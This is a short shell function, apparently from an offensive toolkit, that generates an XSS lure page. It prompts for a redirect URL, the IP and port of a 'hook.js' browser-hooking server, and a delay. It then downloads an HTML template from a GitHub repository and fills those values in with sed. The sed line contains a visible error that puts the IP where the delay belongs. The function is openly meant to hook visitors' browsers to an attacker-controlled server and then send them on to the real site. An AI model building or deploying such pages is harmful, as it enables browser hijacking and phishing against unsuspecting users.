gglog "load xss-html gen a xss html"
xss-html(){
  gglog "set jump to url: "
  read gourl;
  gglog "set hook.js 's ip: exam: xx.x.x.x:3000 "
  read ip;
  gglog "set how many sec to delay then jumt real site"
  read sec;
  wget -q -O- 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/xss-res/_template.html' |  sed "s/{sec}/${ip}/g; s/{gourl}/${gourl}/g; s/{ip}/${ip}/g "
}
